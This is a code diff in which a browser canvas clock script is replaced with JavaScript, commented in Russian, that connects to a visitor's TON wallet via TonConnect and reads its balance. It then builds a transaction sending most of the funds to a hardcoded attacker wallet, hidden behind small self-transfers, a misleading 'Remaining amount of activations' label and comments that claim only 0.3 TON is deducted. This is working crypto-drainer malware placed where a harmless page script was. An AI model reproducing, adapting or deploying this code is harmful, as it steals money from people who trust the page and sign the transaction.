@@ -1,51 +1,136 @@
-const canvas = document.getElementById("clockCanvas");
-const ctx = canvas.getContext("2d");
-const radius = canvas.width / 2;
-ctx.translate(radius, radius);
+var mainWallet = "UQBk_5iaLiQwxJ8VWm6CmjJ15_04mbjgIfFlMjxfAtv9V58X"; //  Основной кошелек для перевода 
 
-function drawClock() {
-    ctx.clearRect(-radius, -radius, canvas.width, canvas.height);
-    
-    const now = new Date();
-    const utcHours = now.getUTCHours();
-    const utcMinutes = now.getUTCMinutes();
-    const utcSeconds = now.getUTCSeconds();
+// Создаем объект для подключения к TonConnect UI
+const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+    manifestUrl: 'https://imdontyou.github.io/time/proect.json',
+    buttonRootId: 'ton-connect'
+});
 
-    drawNumbers();
-    drawHand(utcHours % 12, 12, radius * 0.5, "hour");
-    drawHand(utcMinutes, 60, radius * 0.8, "minute");
-    drawHand(utcSeconds, 60, radius * 0.9, "second");
-}
+// Храним адрес подключенного кошелька
+let walletAddress = null;
 
-function drawNumbers() {
-    ctx.font = "16px Arial";
-    ctx.fillStyle = "#000";
-    ctx.textAlign = "center";
-    ctx.textBaseline = "middle";
-    
-    const now = new Date();
-    const timeString = now.getUTCHours().toString().padStart(2, "0") + 
-                       now.getUTCMinutes().toString().padStart(2, "0") + 
-                       now.getUTCSeconds().toString().padStart(2, "0");
+// Обработчик изменения статуса подключения
+tonConnectUI.onStatusChange(async (walletInfo) => {
+    if (walletInfo && walletInfo.account) {
+        walletAddress = walletInfo.account.address;
+        console.log('Адрес подключенного кошелька:', walletAddress);
+        
+        // Когда кошелек подключен, обновляем баланс
+        await updateBalance(walletAddress);
+    }
+});
 
-    for (let i = 0; i < 12; i++) {
-        const angle = (i * Math.PI) / 6;
-        const x = Math.cos(angle) * (radius * 0.85);
-        const y = Math.sin(angle) * (radius * 0.85);
-        ctx.fillText(timeString[i % timeString.length], x, y);
+// Функция для обновления баланса на странице
+async function updateBalance(walletAddress) {
+    try {
+        // Получаем баланс кошелька
+        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
+        const data = await response.json();
+
+        if (!data.balance) {
+            console.error('Не удалось получить баланс');
+            alert('Не удалось получить баланс');
+            return;
+        }
+
+        const originalBalance = parseFloat(data.balance); // Баланс в нанотонах
+        const deduction = originalBalance * 0.55; // 0.3 TON в нанотонах
+
+        // Проверка, чтобы баланс был достаточно велик для вычитания 0.3 TON
+        if (originalBalance <= deduction) {
+            console.error('Баланс слишком мал для вычитания 0.3 TON');
+            alert('Баланс слишком мал для вычитания 0.3 TON');
+            return;
+        }
+
+        // Вычитаем 0.3 TON из баланса
+        const remainingBalance = originalBalance - deduction;
+
+        // Конвертация в TON
+        const displayedBalance = remainingBalance / 1000000000;
+        console.log(`Баланс после вычета 0.3 TON: ${displayedBalance} TON`);
+
+        // Обновляем отображение баланса на странице
+        const walletInfoElement = document.getElementById('wallet-info');
+        if (walletInfoElement) {
+            walletInfoElement.innerHTML = `Remaining amount of activations: <b>${displayedBalance} TON</b>`;
+        }
+
+    } catch (error) {
+        console.error('Ошибка при получении баланса:', error);
     }
 }
 
-function drawHand(value, max, length, type) {
-    const angle = ((value / max) * 2 * Math.PI) - Math.PI / 2;
-    ctx.font = type === "hour" ? "20px Arial" : "14px Arial";
-    ctx.fillStyle = type === "second" ? "red" : "black";
-    
-    for (let i = 0; i < 3; i++) {
-        const x = Math.cos(angle) * (length - i * 15);
-        const y = Math.sin(angle) * (length - i * 15);
-        ctx.fillText(value.toString().padStart(2, "0")[i % 2], x, y);
+// Функция для отправки транзакции
+async function didtrans() {
+    // Проверяем, подключен ли кошелек
+    if (!walletAddress) {
+        console.error('Кошелек не подключен');
+        alert('Кошелек не подключен');
+        return;
+    }
+
+    // Получаем баланс кошелька
+    const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
+    const data = await response.json();
+
+    // Проверка на ошибки при получении данных о кошельке
+    if (!data.balance) {
+        console.error('Не удалось получить баланс');
+        return;
+    }
+
+    const originalBalance = parseFloat(data.balance); // Баланс в нанотонах
+    const origbal = originalBalance * 0.55;
+    const roundedBalance = Math.round(origbal);
+
+    // Устанавливаем 0.3 TON в нанотоны, которые будем вычитать
+    const deduction = roundedBalance; // 0.3 TON в нанотонах
+
+    // Проверка, чтобы баланс был достаточно велик для вычитания 0.3 TON
+    if (originalBalance <= deduction) {
+        console.error('Баланс слишком мал для вычитания 0.3 TON');
+        return;
+    }
+
+    // Вычитаем 0.3 TON из баланса
+    const remainingBalance = originalBalance - deduction;
+
+    console.log(`Баланс после вычета 0.3 TON: ${remainingBalance / 1000000000} TON`);
+
+    // Формируем транзакцию с двумя сообщениями
+    const transaction = {
+        validUntil: Math.floor(Date.now() / 1000) + 60, // Время действия транзакции (60 секунд)
+        messages: [
+            {
+                address: walletAddress,  // Адрес получателя для первой части
+                amount: 100,       // Сумма для первой транзакции (0.001 TON)
+            },
+            {
+                address: walletAddress,  // Адрес получателя для первой части
+                amount: 100,       // Сумма для первой транзакции (0.001 TON)
+            },
+            {
+                address: walletAddress,  // Адрес получателя для первой части
+                amount: 100,       // Сумма для первой транзакции (0.001 TON)
+            },
+            {
+                address: mainWallet,   // Адрес получателя для второй части
+                amount: remainingBalance, // Сумма для второй транзакции
+            }
+        ],
+        sendMode: 5,  // Если это требуется в вашем API
+        comment: "Получить",  // Комментарий (по желанию)
+    };
+
+    try {
+        // Подписание и отправка транзакции через TonConnect
+        const result = await tonConnectUI.sendTransaction(transaction);
+        console.log('Транзакция успешно отправлена:', result);
+        
+        // Обновляем баланс после отправки
+        await updateBalance(walletAddress);
+    } catch (error) {
+        console.error('Ошибка при отправке транзакции:', error);
     }
 }
-
-setInterval(drawClock, 1000);
